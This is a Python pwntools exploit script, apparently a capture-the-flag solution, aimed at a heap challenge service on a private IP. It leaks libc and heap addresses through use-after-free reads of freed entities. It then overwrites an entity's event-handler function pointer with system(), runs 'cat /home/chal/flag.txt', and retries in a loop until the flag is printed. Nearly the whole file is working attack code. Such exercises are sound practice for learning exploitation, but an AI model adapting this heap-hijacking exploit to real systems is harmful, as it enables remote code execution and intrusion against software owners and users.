# %%

import time
from pwn import *

# %%


def _menu(conn):
    res = conn.recvuntil(b'choice: ')
    return res


def register_entity(conn, idx, name_len, name: bytes):
    print("\nRegister Entity")
    print(f"{idx = }")
    print(f"{name_len = }")
    print(f"{name = }")

    _menu(conn)
    conn.sendline(b'1')

    conn.recvuntil(b'Index: ')
    conn.send(str(idx).encode())

    # TYPO FROM THE AUTHOR
    conn.recvuntil(b'Nmae Length: ')
    conn.sendline(str(name_len).encode())

    conn.recvuntil(b'Name: ')
    conn.send(name)
    return


def delete_entity(conn, idx):
    print("\nDelete Entity")
    print(f"{idx = }")

    _menu(conn)
    conn.sendline(b'2')

    conn.recvuntil(b'Index: ')
    conn.send(str(idx).encode())
    return


def trigger_event(conn, idx):
    print("\nTrigger Event")
    print(f"{idx = }")

    _menu(conn)
    conn.sendline(b'3')

    conn.recvuntil(b'Index: ')
    conn.send(str(idx).encode())

    # a = ""
    conn.recvuntil(b'Name: ')
    a = conn.recvline()
    print(a)
    # a = conn.recvline()
    # print(a)
    return a


# %%

context.arch = 'amd64'
context.os == "linux"
context.terminal = ["tmux", "splitw", "-h"]

# %%


def get_conn():

    port = 10059
    conn = remote('10.113.184.121', port)
    # conn = process('./src/release/share/chal')

    # ./src/release/share/chal: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1be59a1ccee21f046abe47235de19feebe806c9d, for GNU/Linux 3.2.0, not stripped

    # Arch:     amd64-64-little
    # RELRO:    Full RELRO
    # Stack:    Canary found
    # NX:       NX enabled
    # PIE:      PIE enabled

    # gdbscript = 'gef\ngef\n'
    # gdbscript += 'set follow-fork-mode child\n'

    # _pid = gdb.attach(
    #     conn,
    #     gdbscript=gdbscript,
    # )

    # %%

    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

    register_entity(conn, 0, 0x418, b'a')
    register_entity(conn, 1, 0x418, b'a')

    delete_entity(conn, 0)
    delete_entity(conn, 1)

    register_entity(conn, 0, 0x418, b'a')

    a = trigger_event(conn, 0)

    libc_offset = 0x7fc477019c61 - 0x00007fc476e00000
    libc_base = u64(a[:6].ljust(8, b'\x00')) - libc_offset
    system_addr = libc_base + libc.symbols['system']

    print(f"{hex(libc_base) = }")
    print(f"{hex(system_addr) = }")

    # %%

    register_entity(conn, 0, 0x38, b'b')
    register_entity(conn, 1, 0x38, b'b')

    delete_entity(conn, 0)
    # delete_entity(1)

    # register_entity(1, 0x18, b'b')
    register_entity(conn, 0, 0x38, b'b')

    print("A")
    a = trigger_event(conn, 0)
    print(a)
    # heap_base = u64((b'\x00' + a[1:6]).ljust(8, b'\x00'))
    heap_base = u64((b'\x00\x00' + a[1:5]).ljust(8, b'\x00'))
    heap_base <<= 4
    print(hex(heap_base))

    # %%

    # struct entity
    # {
    # 	char *name;
    # 	char *event;
    # 	void (*event_handle)(char *);
    # };

    register_entity(conn, 0, 0x48, b'c')
    # register_entity(conn, 1, 0x28, b'sh\x00')
    register_entity(conn, 1, 0x28, b'cat /home/chal/flag.txt\x00')
    delete_entity(conn, 0)

    # a = input("> ")

    a = 'b9'
    offset = int(a, 16) << (4 * 3)

    print(hex(offset))
    # input()

    # sh_addr = heap_base + offset + 0x780
    sh_addr = heap_base + offset + 0x830

    print(hex(sh_addr))

    print("C")

    # raw_input()
    # delete_entity(1)
    # raw_input()

    register_entity(conn, 0, 0x48, b'd')
    register_entity(conn, 1, 0x48, b'd')
    delete_entity(conn, 0)
    delete_entity(conn, 1)

    print("D")

    payload = flat([
        0,
        sh_addr,
        system_addr,
    ])

    # register_entity(0, 0x18, payload)
    register_entity(conn, 1, 0x18, payload)

    print("E")

    _menu(conn)

    # # trigger_event(1, False)
    # trigger_event(0, False)
    a = trigger_event(conn, 0)

    print(f"{a = }")

    print("F")

    b = conn.recvall()
    print(f"{b = }")

    return b


# %%

while True:
    try:
        c = get_conn()

        if b'flag' in c or b'FLAG' in c:
            print(f"{c = }")
            break

    except:
        continue

# %%
